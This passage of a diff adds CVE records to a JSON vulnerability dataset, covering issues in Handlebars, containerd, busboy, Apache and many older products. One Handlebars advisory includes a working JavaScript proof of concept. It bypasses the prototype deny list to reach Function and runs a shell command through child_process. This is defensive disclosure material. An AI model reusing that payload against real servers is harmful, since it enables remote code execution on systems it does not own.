value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.\n\n## Credits\n\n### Variant `Program.blockParams`\n- [Nick Mykhailyshyn - @whoareme](https://x.com/whoareme33)\n- [jmoritzc53 ](https://github.com/jmoritzc53)\n- [bhaswanthc ](https://github.com/bhaswanthc)\n- [dinhvaren ](https://github.com/dinhvaren)\n- [n0tra4e ](https://github.com/n0tra4e) \n- [PellaML](https://github.com/PellaML)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [sanmatte](https://github.com/sanmatte)\n\n### Variant `BooleanLiteral|NumberLiteral.value`\n\n- [sondt99 ](https://github.com/sondt99) Thai Son Dinh from VinSOC Labs (R&D)\n- [Ahmed-Elmahgob ](https://github.com/Ahmed-Elmahgob)\n- [nikolakojic-rasit ](https://github.com/nikolakojic-rasit)\n- [vk-can](https://github.com/vk-can)\n- [shenhuanageshei](https://github.com/shenhuanageshei)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [ffasterss](https://github.com/ffasterss)\n\n### Variant `PathExpression.depth`\n\n- [hibrian827](https://github.com/hibrian827) Team Atlanta\n- [oss-security-shopify](https://github.com/oss-security-shopify)",
+      "cvssScore": 9.8,
+      "severity": "Critical",
+      "published": "2026-10-08",
+      "modified": "2026-10-08",
+      "cwe": {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      },
+      "references": [
+        "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-8r5x-fm3f-whwj",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-106446",
+        "https://github.com/handlebars-lang/handlebars.js/pull/2185",
+        "https://github.com/handlebars-lang/handlebars.js/commit/703fdcc5fd6cc8d1cc0c33cc19de40c467c4b8d2",
+        "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+      ],
+      "vulnerableProducts": [
+        "handlebars npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-106445",
+      "summary": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\n1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// constructor deny list bypass via hasOwnProperty check in lookupProperty\nconst template = Handlebars.compile(\n    // construct code array from template string literal\n    '{{#with a}}' +\n      '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n      '{{lookup \"\" (pop)}}' +\n      '{{lookup \"\" (shift)}}' +\n    '{{/with}}' +\n\n    // access Function via own property bypass on Function.prototype.constructor\n    '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\n    // #each sets depth0=Function without calling it, apply avoids hash body\n    '{{#each @root}}{{#if @index}}{{else}}' +\n      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n    '{{/if}}{{/each}}'\n);\n\nconst result = template(\n    { fn: function(){}, a: [0] },\n    { allowProtoMethodsByDefault: true }\n);\n\nconsole.log(result.trim());\n\n// output: uid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n## Workarounds\n\nDo not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.",
+      "cvssScore": 9.2,
+      "severity": "Critical",
+      "published": "2026-10-08",
+      "modified": "2026-10-08",
+      "cwe": {
+        "cwe_id": "CWE-184",
+        "name": "Incomplete List of Disallowed Inputs"
+      },
+      "references": [
+        "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-p8wg-vrv2-v86f",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-106445",
+        "https://github.com/handlebars-lang/handlebars.js/pull/2185",
+        "https://github.com/handlebars-lang/handlebars.js/commit/ceec388abe1d1aac8f6369860d5f390fa71ef4fa",
+        "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+      ],
+      "vulnerableProducts": [
+        "handlebars npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0829",
+      "summary": "HP Secure Web Console uses weak encryption.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-11-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0829",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0829"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0973",
+      "summary": "BSCW groupware system 3.3 through 4.0.2 beta allows remote attackers to read or modify arbitrary files by uploading and extracting a tar file with a symlink into the data-bag space.",
+      "cvssScore": 6.4,
+      "severity": "Medium",
+      "published": "2001-08-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-08/0328.html",
+        "http://bscw.gmd.de/Bulletins/BSCW-SB-2001-08.extract.txt",
+        "http://www.iss.net/security_center/static/7029.php",
+        "http://www.kb.cert.org/vuls/id/465971",
+        "http://www.securityfocus.com/bid/3227"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0976",
+      "summary": "Vulnerability in HP Process Resource Manager (PRM) C.01.08.2 and earlier, as used by HP-UX Workload Manager (WLM), allows local users to gain root privileges via modified libraries or environment variables.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-08-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/hp/2001-q3/0048.html",
+        "http://archives.neohapsis.com/archives/hp/2001-q3/0048.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0981",
+      "summary": "HP CIFS/9000 Server (SAMBA) A.01.07 and earlier with the \"unix password sync\" option enabled calls the passwd program without specifying the username of the user making the request, which could cause the server to change the password of a different user.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2001-08-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/hp/2001-q3/0048.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7051",
+        "http://archives.neohapsis.com/archives/hp/2001-q3/0048.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7051"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1195",
+      "summary": "Cross-site scripting vulnerability (XSS) in the PHP interface for ht://Check 1.1 allows remote web servers to insert arbitrary HTML, including script, via a web page.",
+      "cvssScore": 4.3,
+      "severity": "Medium",
+      "published": "2002-10-28",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=103184269605160&w=2",
+        "http://www.debian.org/security/2002/dsa-169",
+        "http://www.iss.net/security_center/static/10089.php",
+        "http://www.securityfocus.com/bid/5699",
+        "http://marc.info/?l=bugtraq&m=103184269605160&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1196",
+      "summary": "editproducts.cgi in Bugzilla 2.14.x before 2.14.4, and 2.16.x before 2.16.1, when the \"usebuggroups\" feature is enabled and more than 47 groups are specified, does not properly calculate bit values for large numbers, which grants extra permissions to users via known features of Perl math that set multiple bits.",
       "cvssScore": 7.5,
       "severity": "High",
+      "published": "2002-10-28",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://bugzilla.mozilla.org/show_bug.cgi?id=167485#c12",
+        "http://marc.info/?l=bugtraq&m=103349804226566&w=2",
+        "http://www.debian.org/security/2002/dsa-173",
+        "http://www.iss.net/security_center/static/10233.php",
+        "http://www.securityfocus.com/bid/5843"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0967",
+      "summary": "rad_decode in FreeRADIUS 0.9.2 and earlier allows remote attackers to cause a denial of service (crash) via a short RADIUS string attribute with a tag, which causes memcpy to be called with a -1 length argument, as demonstrated using the Tunnel-Password attribute.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2003-12-15",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=106935911101493&w=2",
+        "http://marc.info/?l=bugtraq&m=106944220426970",
+        "http://marc.info/?l=freeradius-users&m=106947389449613&w=2",
+        "http://www.redhat.com/support/errata/RHSA-2003-386.html",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A10917"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0968",
+      "summary": "Stack-based buffer overflow in SMB_Logon_Server of the rlm_smb experimental module for FreeRADIUS 0.9.3 and earlier allows remote attackers to execute arbitrary code via a long User-Password attribute.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2003-12-15",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=106986437621130&w=2",
+        "http://marc.info/?l=bugtraq&m=106986437621130&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1052",
+      "summary": "Microsoft FrontPage stores form results in a default location in /_private/form_results.txt, which is world-readable and accessible in the document root, which allows remote attackers to read possibly sensitive information submitted by other users.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-08-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=93582550911564&w=2",
+        "http://marc.info/?l=bugtraq&m=93582550911564&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0153",
+      "summary": "Buffer overflow in VB-TSQL debugger object (vbsdicli.exe) in Visual Studio 6.0 Enterprise Edition allows remote attackers to execute arbitrary commands.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-05-03",
+      "modified": null,
+      "cwe": "CWE-119",
+      "references": [
+        "http://razor.bindview.com/publish/advisories/adv_vbtsql.html",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-018",
+        "http://razor.bindview.com/publish/advisories/adv_vbtsql.html",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-018"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0154",
+      "summary": "HTML e-mail feature in Internet Explorer 5.5 and earlier allows attackers to execute attachments by setting an unusual MIME type for the attachment, which Internet Explorer does not process correctly.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-05-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=98596775905044&w=2",
+        "http://securitytracker.com/id?1001197",
+        "http://www.cert.org/advisories/CA-2001-06.html",
+        "http://www.ciac.org/ciac/bulletins/l-066.shtml",
+        "http://www.osvdb.org/7806"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0165",
+      "summary": "Buffer overflow in ximp40 shared library in Solaris 7 and Solaris 8 allows local users to gain privileges via a long \"arg0\" (process name) argument.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-05-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0517.html",
+        "http://www.securityfocus.com/bid/2322",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6039",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-01/0517.html",
+        "http://www.securityfocus.com/bid/2322"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0167",
+      "summary": "Buffer overflow in AT&T WinVNC (Virtual Network Computing) client 3.3.3r7 and earlier allows remote attackers to execute arbitrary commands via a long rfbConnFailed packet with a long reason string.",
+      "cvssScore": 7.6,
+      "severity": "High",
+      "published": "2001-05-03",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=98088315825366&w=2",
+        "http://www.securityfocus.com/bid/2305",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6025",
+        "http://marc.info/?l=bugtraq&m=98088315825366&w=2",
+        "http://www.securityfocus.com/bid/2305"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-90519",
+      "summary": "A weakness has been identified in PHPGurukul Bank Locker Management System 1.0. Affected is an unknown function of the file /blms/banker/add-locker-form.php. This manipulation of the argument addressproof causes unrestricted upload. Remote exploitation of the attack is possible. The exploit has been made available to the public and could be used for attacks.",
+      "cvssScore": 6.3,
+      "severity": "Medium",
+      "published": "2026-09-13",
+      "modified": null,
+      "cwe": "CWE-284",
+      "references": [
+        "https://github.com/wakakakaaaaha/vuln/issues/5",
+        "https://phpgurukul.com/",
+        "https://vuldb.com/cve/CVE-2026-90519",
+        "https://vuldb.com/submit/912224",
+        "https://vuldb.com/vuln/403106"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1558",
+      "summary": "Cisco ONS15454 and ONS15327 running ONS before 3.4 have an account for the VxWorks Operating System in the TCC, TCC+ and XTC that cannot be changed or disabled, which allows remote attackers to gain privileges by connecting to the account via Telnet.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2003-03-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.cisco.com/warp/public/707/ons-multiple-vuln-pub.shtml",
+        "http://www.iss.net/security_center/static/10510.php",
+        "http://www.securityfocus.com/bid/6083",
+        "http://www.cisco.com/warp/public/707/ons-multiple-vuln-pub.shtml",
+        "http://www.iss.net/security_center/static/10510.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-103484",
+      "summary": "IVFFlat index build in pgvector before 0.8.7 allows a database user to write data out-of-bounds, which can lead to arbitrary code execution.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-10-01",
+      "modified": "2026-10-01",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-103484",
+        "https://github.com/pgvector/pgvector/issues/1036",
+        "https://github.com/pgvector/pgvector/commit/ee00d39ab30c2a7cf9510abf9288c624d91db156"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-53493",
+      "summary": "### Impact\n\nA vulnerability exists in containerd's image pull handlers where a crafted OCI image index containing deeply nested or heavily fanned-out descriptor graphs can cause unbounded CPU and memory consumption. During the `PullImage` operation, the recursive traversal and processing of child descriptors lack sufficient depth and breadth limits, and fail to adequately deduplicate identical descriptors. This unbounded traversal leads to excessive resource allocation.\n\nConsequently, pulling a malicious image reference can result in prolonged stalls during container creation and significant resource pressure on the host system. This issue occurs entirely during the image pull phase, prior to any container execution.\n\n### Patches\n\nThis bug has been fixed in containerd 2.4.1, 2.3.6, 2.2.9, 2.0.13, and 1.7.36. Users should update to these versions to resolve the issue.\n\n### Workarounds\n\nThere are no known workarounds for this issue. Users are advised to only pull trusted images from known registries until the patch can be applied.\n\n### Credits\n\nThe containerd project would like to thank Jakub Ciolek at ElevenLabs and @jlgore who independently discovered and responsibly disclosed this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/main/SECURITY.md).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [containerd](https://github.com/containerd/containerd/issues/new/choose)\n* Email us at [security@containerd.io](mailto:security@containerd.io)\n\nTo report a security issue in containerd:\n* [Report a new vulnerability](https://github.com/containerd/containerd/security/advisories/new)\n* Email us at [security@containerd.io](mailto:security@containerd.io)",
+      "cvssScore": 6.9,
+      "severity": "Medium",
+      "published": "2026-09-25",
+      "modified": "2026-09-25",
+      "cwe": {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
+      "references": [
+        "https://github.com/containerd/containerd/security/advisories/GHSA-pg57-6jwg-q645",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-53493",
+        "https://github.com/containerd/containerd/commit/4f5f32636d47f051751065cf824a10da70c619fe",
+        "https://github.com/containerd/containerd/commit/94e83c14c8aac963e24e28105dab9c9af812a2a8",
+        "https://github.com/containerd/containerd/releases/tag/v1.7.36"
+      ],
+      "vulnerableProducts": [
+        "github.com/containerd/containerd/v2 go",
+        "github.com/containerd/containerd go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-57307",
+      "summary": "Jenkins Zowe zDevOps Plugin 1.1.3.50.ve350c9b_450b_1 and earlier does not perform a permission check in an HTTP endpoint implementing a connection test.\n\nThis allows attackers with Overall/Read permission to connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins.\n\nAdditionally, this HTTP endpoint does not require POST requests, resulting in a cross-site request forgery (CSRF) vulnerability.\n\nAs of publication of this advisory, there is no fix.",
+      "cvssScore": 5.2,
+      "severity": "Medium",
+      "published": "2026-06-24",
+      "modified": "2026-09-25",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-57307",
+        "https://github.com/jenkinsci/zdevops-plugin",
+        "https://www.jenkins.io/security/advisory/2026-06-24/#SECURITY-3747"
+      ],
+      "vulnerableProducts": [
+        "io.jenkins.plugins:zdevops Maven"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1625",
+      "summary": "Macromedia Flash Player 6 does not terminate connections when the user leaves the web page, which allows remote attackers to cause a denial of service (bandwidth, resource, and CPU consumption) via the (1) loadMovie or (2) loadSound commands, which continue to execute until the browser is closed.",
+      "cvssScore": 5,
+      "severity": "Medium",
       "published": "2002-12-31",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/archive/1/285639",
-        "http://www.securityfocus.com/archive/1/285695",
-        "http://www.securityfocus.com/archive/1/285639",
-        "http://www.securityfocus.com/archive/1/285695"
+        "http://www.kb.cert.org/vuls/id/128491",
+        "http://www.macromedia.com/v1/handlers/index.cfm?ID=22796&Method=Full&Title=Macromedia%20Flash%20Player%206%20Streaming%20Issue&Cache=False",
+        "http://www.securityfocus.com/bid/4567",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/8925",
+        "http://www.kb.cert.org/vuls/id/128491"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-2157",
-      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: CVE-2002-1660.  Reason: This candidate is a duplicate of CVE-2002-1660.  Notes: All CVE users should reference CVE-2002-1660 instead of this candidate.  All references and descriptions in this candidate have been removed to prevent accidental usage",
+      "id": "CVE-2002-1626",
+      "summary": "Directory traversal vulnerability in Mike Spice My Calendar before 1.5 allows remote attackers to write arbitrary files via .. (dot dot) sequences in a URL.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://securitytracker.com/id?1003256",
+        "http://www.kb.cert.org/vuls/id/806091",
+        "http://www.securityfocus.com/bid/3856",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7966",
+        "http://securitytracker.com/id?1003256"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1627",
+      "summary": "Directory traversal vulnerability in quiz.cgi for Mike Spice Quiz Me! before 0.6 allows remote attackers to write arbitrary files via .. (dot dot) sequences in the quiz parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://securitytracker.com/id?1003254",
+        "http://www.kb.cert.org/vuls/id/318835",
+        "http://www.securityfocus.com/bid/3857",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7970",
+        "http://securitytracker.com/id?1003254"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1628",
+      "summary": "Directory traversal vulnerability in vote.cgi for Mike Spice Mike's Vote CGI before 1.3 allows remote attackers to write arbitrary files via .. (dot dot) sequences in the type parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.kb.cert.org/vuls/id/250107",
+        "http://www.securityfocus.com/bid/3854",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7971",
+        "http://www.kb.cert.org/vuls/id/250107",
+        "http://www.securityfocus.com/bid/3854"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1069",
+      "summary": "libCoolType library as used in Adobe Acrobat (acroread) on Linux creates the AdobeFnt.lst file with world-writable permissions, which allows local users to modify the file and possibly modify acroread's behavior.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2001-08-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://lists.debian.org/debian-security/2001/debian-security-200101/msg00085.html",
+        "http://marc.info/?l=bugtraq&m=99849121502399&w=2",
+        "http://www.securityfocus.com/bid/3225",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7024",
+        "http://lists.debian.org/debian-security/2001/debian-security-200101/msg00085.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1070",
+      "summary": "Sage Software MAS 200 allows remote attackers to cause a denial of service by connecting to port 10000 and entering a series of control characters.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2001-08-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-08/0312.html",
+        "http://www.securityfocus.com/bid/3221",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7020",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-08/0312.html",
+        "http://www.securityfocus.com/bid/3221"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0105",
+      "summary": "Outlook Express 5.01 and Internet Explorer 5.01 allow remote attackers to view a user's email messages via a script that accesses a variable that references subsequent email messages that are read by the client.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-02-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/962",
+        "http://www.securityfocus.com/bid/962"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-74866",
+      "summary": "### Impact\n\n`@fastify/busboy` 3.2.1 and earlier retains a bare carriage return or line feed inside the parsed `Content-Disposition` parameters returned to the application. The multipart header parser ends a header line only on the two-byte `\\r\\n` sequence, so a lone CR or LF embedded in a part header is carried verbatim into the `filename` and field `name` delivered by the `file` and `field` events. An application that forwards the supplied filename or name into a CR/LF-sensitive sink cannot anticipate the embedded control character.\n\nAn attacker who uploads a file whose `filename` or field `name` contains a bare CR or LF can pollute filenames on disk when the upload is saved under its original name, inject forged lines into logs, or inject headers on a downstream hop that does not re-validate CR/LF, such as object-storage metadata or a proxied backend. Applications using `@fastify/busboy` directly, or through `@fastify/multipart` and its consumers, are affected.\n\n### Patches\n\nUpgrade to `@fastify/busboy` 3.2.2 or later.\n\n### Workarounds\n\nValidate or strip carriage return and line feed characters from the `filename` and field `name` before using them in any filesystem, logging, or outbound-header context.",
+      "cvssScore": 5.8,
+      "severity": "Medium",
+      "published": "2026-10-05",
+      "modified": "2026-10-05",
+      "cwe": {
+        "cwe_id": "CWE-93",
+        "name": "Improper Neutralization of CRLF Sequences ('CRLF Injection')"
+      },
+      "references": [
+        "https://github.com/fastify/busboy/security/advisories/GHSA-gxm5-99cw-xjw9",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-74866",
+        "https://github.com/fastify/busboy/commit/cc7da17c5c88d79c314a9e149a79e5a00a6c23be",
+        "https://cna.openjsf.org/security-advisories.html",
+        "https://github.com/fastify/busboy/releases/tag/v3.2.2"
+      ],
+      "vulnerableProducts": [
+        "@fastify/busboy npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0867",
+      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: CVE-2003-0662.  Reason: This candidate is a duplicate of CVE-2003-0662.  Notes: All CVE users should reference CVE-2003-0662 instead of this candidate.  All references and descriptions in this candidate have been removed to prevent accidental usage",
       "cvssScore": null,
       "severity": "Unknown",
-      "published": "2002-12-31",
+      "published": "2003-11-17",
       "modified": null,
       "cwe": null,
       "references": [],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1482",
+      "summary": "The backup configuration file for Microsoft MN-500 wireless base station stores administrative passwords in plaintext, which allows local users to gain access.",
+      "cvssScore": 4.6,
+      "severity": "Medium",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": "CWE-255",
+      "references": [
+        "http://securitytracker.com/id?1006691",
+        "http://www.kurczaba.com/html/security/0305031.htm",
+        "http://www.securityfocus.com/bid/7496",
+        "http://securitytracker.com/id?1006691",
+        "http://www.kurczaba.com/html/security/0305031.htm"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0216",
+      "summary": "Denial of service of inetd on Linux through SYN and RST packets.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1997-11-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0216",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0216"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-90522",
+      "summary": "A vulnerability was determined in jaychouchannel Tourism-Management-System up to d984d172dceca907f8b447efbdb06dc233f7938d. Impacted is the function resetPass of the file UsersController.java of the component Password Recovery. This manipulation causes weak password recovery. The attack can be initiated remotely. The exploit has been publicly disclosed and may be utilized. Continious delivery with rolling releases is used by this product. Therefore, no version details of affected nor updated releases are available. Patch name: 9cb6215ac871f99a90cde763cf003e95ff282283. It is recommended to apply a patch to fix this issue.",
+      "cvssScore": 7.3,
+      "severity": "High",
+      "published": "2026-09-13",
+      "modified": null,
+      "cwe": "CWE-640",
+      "references": [
+        "https://github.com/jaychouchannel/Tourism-Management-System/",
+        "https://github.com/jaychouchannel/Tourism-Management-System/commit/9cb6215ac871f99a90cde763cf003e95ff282283",
+        "https://github.com/jaychouchannel/Tourism-Management-System/issues/13",
+        "https://vuldb.com/cve/CVE-2026-90522",
+        "https://vuldb.com/submit/912236"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-27872",
+      "summary": "- Improper Privilege Management vulnerability in Johnson Controls Easy IO FG allows (Brute Force).\n\nThis issue affects Easy IO FG: before 2.0b52.",
+      "cvssScore": null,
+      "severity": "Medium",
+      "published": "2026-10-01",
+      "modified": "2026-10-01",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-27872",
+        "https://www.johnsoncontrols.com/trust-center/cybersecurity/security-advisories"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-73636",
+      "summary": "Authentication bypass by capture-replay in mod_auth_digest in Apache Software Foundation Apache HTTP Server 2.4.x on all platforms allows a man-in-the-middle (MITM) attacker to replay captured digest authentication credentials via crafted requests that trigger garbage collection of the client's shared memory entry when AuthDigestNonceLifetime is set to 0.\n\nUsers are recommended to upgrade to version 2.4.69, which fixes this issue.",
+      "cvssScore": 7.4,
+      "severity": "High",
+      "published": "2026-10-01",
+      "modified": "2026-10-01",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-73636",
+        "https://httpd.apache.org/security/vulnerabilities_24.html",
+        "http://www.openwall.com/lists/oss-security/2026/10/01/27"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-93546",
